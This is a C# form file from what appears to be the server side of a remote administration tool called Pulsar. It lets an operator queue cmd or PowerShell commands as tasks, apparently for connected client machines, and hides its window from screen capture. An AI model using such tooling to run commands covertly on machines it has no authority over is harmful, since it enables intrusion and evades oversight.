﻿using Pulsar.Common.DNS;
using Pulsar.Server.Forms.DarkMode;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace Pulsar.Server.Forms
{
    public partial class FrmTaskCommand : Form
    {
        public FrmTaskCommand()
        {
            InitializeComponent();
            DarkModeManager.ApplyDarkMode(this);
			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
        }

        private void FrmTaskCommand_Load(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            string host;

            if (ShellComboBox.SelectedIndex == 0)
            {
                host = "conhost.exe";
            }
            else
            {
                host = "powershell.exe";
            }

            FrmMain frm = Application.OpenForms["FrmMain"] as FrmMain;
            if (frm != null)
            {
                frm.AddTask("Shell Command", host, CTextBox.Text);
            }
        }
    }
}
